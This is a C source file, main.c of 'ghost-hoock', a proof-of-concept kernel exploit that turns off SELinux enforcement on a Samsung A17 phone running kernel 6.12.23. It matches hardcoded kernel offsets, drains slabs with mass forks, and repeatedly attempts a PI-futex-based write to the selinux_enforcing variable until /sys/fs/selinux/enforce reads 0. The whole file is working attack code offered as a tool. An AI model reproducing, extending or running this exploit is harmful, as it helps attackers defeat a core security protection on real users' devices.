/* main.c — ghost-hoock: SELinux-off PoC for Samsung A17 (BZA5, 6.12.23)
 *
 * Usage:
 *   ghost-hoock [--attempts N] [--no-drain] [--verbose]
 *
 * Exits 0 on success (SELinux permissive), 1 on failure.
 *
 * This is a minimal fork of GhostLock (MIT) — only the W1 route
 * (selinux_enforcing = 0 via a constrained PI-futex write + pselect) is
 * kept. No root, no cred overwrite, no rwforge.
 */
#include "ghost_hoock.h"
#include <getopt.h>

/* --- offset table selection --- */
const struct kernel_offsets *active_offsets = NULL;

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      if (active_offsets->kernel_phys_load) {
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      }
      pr_info("init_cred image=%016zx alias=%016zx\n",
              (size_t)INIT_CRED, (size_t)data_addr(INIT_CRED));
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to include/offsets_bza5.h and rebuild\n");
  return -1;
}

/* --- misc helpers --- */
void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk */
  attr.sched_nice = nice_value;
  errno = 0;
  long ret = syscall(274, tid, &attr, 0);
  if (ret != 0) {
    pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n",
             tid, nice_value, ret, errno);
  }
  return ret;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) return;
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) return;
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') p++;
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) len = sizeof(values[i]) - 1;
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr, enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s\n",
             getpid(), BUILD_VARIANT_LABEL);
}

int env_flag(const char *name, int def) {
  char *v = getenv(name);
  if (!v) return def;
  return atoi(v);
}

int env_int_range(const char *name, int def, int min, int max) {
  char *v = getenv(name);
  if (!v) return def;
  int val = (int)strtol(v, NULL, 0);
  if (val < min) return min;
  if (val > max) return max;
  return val;
}

/* --- SELinux check --- */
static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) {
    /* no SELinux at all — treat as already off */
    return 1;
  }
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

/* --- slab drain: allocate/free many children to clear partial slabs --- */
static void slab_drain(void) {
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

/* --- main --- */
static void usage(const char *prog) {
  fprintf(stderr,
    "ghost-hoock — SELinux-off PoC (Samsung A17 BZA5, 6.12.23)\n"
    "Usage: %s [options]\n"
    "  --attempts N   W1 attempts (default 20)\n"
    "  --no-drain     skip slab_drain before W1\n"
    "  --verbose      print every route round\n"
    "  -h, --help     this help\n",
    prog);
}

int main(int argc, char **argv) {
  int attempts = 20;
  int no_drain = 0;

  static const struct option long_opts[] = {
    {"attempts", required_argument, 0, 'a'},
    {"no-drain", no_argument,       0, 'n'},
    {"verbose",  no_argument,       0, 'v'},
    {"help",     no_argument,       0, 'h'},
    {0, 0, 0, 0}
  };
  int opt;
  while ((opt = getopt_long(argc, argv, "a:nvh", long_opts, NULL)) != -1) {
    switch (opt) {
      case 'a': attempts = atoi(optarg); break;
      case 'n': no_drain = 1; break;
      case 'v': /* verbose is the default; kept for symmetry */ break;
      case 'h': usage(argv[0]); return 0;
      default: usage(argv[0]); return 1;
    }
  }
  if (attempts < 1) attempts = 1;
  if (attempts > 200) attempts = 200;

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();

  if (select_offsets() < 0) return 1;

  log_startup_context();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);

  /* BZA5 boots with KASLR effectively disabled — slide=0. */
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;

  if (check_selinux_off()) {
    pr_success("SELinux already permissive — nothing to do\n");
    return 0;
  }

  uintptr_t target = data_addr(SELINUX_ENFORCING);
  pr_info("target selinux_enforcing=%016zx\n", target);

  for (int att = 1; att <= attempts; att++) {
    if (!no_drain) slab_drain();
    pr_info("W1 attempt %d/%d\n", att, attempts);
    do_one_write(target, "W1: SELinux", 1);
    usleep(100000);
    if (check_selinux_off()) {
      pr_success("SELinux DISABLED (attempt %d)\n", att);
      return 0;
    }
    pr_warning("W1 attempt %d did not take effect\n", att);
  }

  pr_error("W1 failed after %d attempts\n", attempts);
  return 1;
}
